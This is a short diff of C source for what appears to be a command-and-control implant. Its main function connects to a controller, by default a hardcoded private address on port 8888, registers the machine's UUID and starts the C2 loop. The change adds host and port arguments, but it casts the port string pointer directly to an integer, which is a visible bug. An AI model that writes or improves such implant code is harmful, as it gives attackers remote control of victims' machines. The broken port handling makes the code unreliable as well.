@@ -55,27 +55,35 @@ int connect_to(char *host, int port)
 int main(int argc, char *argv[])
 {
     c2_t *c2;
-    int c2_fd;
+
+    int fd;
     char uuid[UUID_SIZE];
 
     c2 = NULL;
 
     if (strcmp(argv[0], "p") == 0)
     {
-        c2_fd = (int)((long *)argv)[1];
+        fd = (int)((long *)argv)[1];
 
         if (machine_uuid(uuid) < 0)
             return 1;
 
-        c2_add(&c2, 0, c2_fd, uuid);
-    } else
+        c2_add(&c2, 0, fd, uuid);
+    }
+    else
     {
-        c2_fd = connect_to("192.168.64.1", 8888);
+        if (argc >= 3)
+            fd = connect_to(argv[1], (int)argv[2]);
+        else
+            fd = connect_to("192.168.64.1", 8888);
+
+        if (fd < 0)
+            return 1;
 
         if (machine_uuid(uuid) < 0)
             return 1;
 
-        c2_add(&c2, 0, c2_fd, uuid);
+        c2_add(&c2, 0, fd, uuid);
     }
 
     c2_init(c2);
